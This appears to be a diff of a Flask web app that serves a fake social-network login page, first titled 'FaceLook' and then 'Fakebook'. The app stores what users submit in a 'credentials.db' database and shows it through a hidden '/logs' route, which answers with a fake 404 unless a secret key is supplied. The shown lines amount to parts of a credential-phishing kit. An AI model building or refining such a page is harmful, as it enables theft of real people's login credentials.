@@ -4,7 +4,6 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# Initialize database
 def init_db():
     conn = sqlite3.connect('credentials.db')
     c = conn.cursor()
@@ -24,7 +23,7 @@ html_content = """
 <head>
     <meta charset=\"UTF-8\">
     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
-    <title>FaceLook - Log In</title>
+    <title>Fakebook - Log In</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -156,7 +155,6 @@ def login():
 
 @app.route('/logs')
 def show_logs():
-    # Simple secret key verification
     if request.args.get('secret') != 'supersecret':
         return "Not Found", 404
     
